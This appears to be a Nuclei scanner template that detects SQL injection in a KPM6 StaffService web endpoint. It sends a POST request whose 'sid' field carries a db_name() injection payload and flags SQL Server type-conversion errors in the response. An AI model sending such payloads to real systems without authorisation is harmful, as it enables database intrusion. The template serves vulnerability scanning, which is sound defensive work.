id: KPM6-StaffService-sqlInjection

info:
  name: KPM6-StaffService-sqlInjection
  author: iSee857
  severity: high
  description: |
    KPM6-StaffService-sqlInjection

http:
  - raw:
      - |
        POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sid=db_name()
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "转换成"
          - "nvarchar"
        condition: and

      - type: status
        status:
          - 500